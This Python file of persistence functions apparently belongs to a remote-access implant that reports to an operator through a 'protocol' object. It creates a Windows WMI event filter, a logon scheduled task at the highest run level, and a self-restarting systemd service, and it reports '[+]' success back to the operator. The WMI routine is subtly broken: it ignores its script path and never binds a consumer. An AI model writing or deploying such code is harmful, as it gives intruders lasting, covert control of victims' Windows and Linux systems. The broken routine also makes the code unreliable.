import os
import subprocess


def install_wmi_persistence(protocol, script_path, event_name='SystemStartup'):
    """Install WMI event subscription for persistence (Windows)."""
    try:
        command = (
            f'wmic /namespace:"\\\\root\\subscription" PATH __EventFilter '
            f'CREATE Name="{event_name}", '
            f'QueryLanguage="WQL", '
            f'Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 '
            f'WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'"'
        )
        subprocess.run(command, shell=True, capture_output=True)
        protocol.send(f'[+] WMI persistence installed: {event_name}')
    except Exception as e:
        protocol.send(f'[-] WMI persistence failed: {str(e)}')


def install_scheduled_task(protocol, task_name, executable_path):
    """Install scheduled task for persistence (Windows)."""
    try:
        cmd = (
            f'schtasks /create /tn "{task_name}" /tr "{executable_path}" '
            f'/sc ONLOGON /rl HIGHEST /f'
        )
        subprocess.run(cmd, shell=True, capture_output=True)
        protocol.send(f'[+] Scheduled task created: {task_name}')
    except Exception as e:
        protocol.send(f'[-] Scheduled task failed: {str(e)}')


def install_systemd_service(protocol, service_name, executable_path):
    """Install systemd service for persistence (Linux)."""
    try:
        service_content = f"""[Unit]
Description={service_name}
After=network.target

[Service]
Type=simple
ExecStart={executable_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        service_path = f'/etc/systemd/system/{service_name}.service'
        with open(service_path, 'w') as f:
            f.write(service_content)
        subprocess.run('systemctl daemon-reload', shell=True)
        subprocess.run(f'systemctl enable {service_name}', shell=True)
        subprocess.run(f'systemctl start {service_name}', shell=True)
        protocol.send(f'[+] Systemd service installed: {service_name}')
    except Exception as e:
        protocol.send(f'[-] Systemd service failed: {str(e)}')
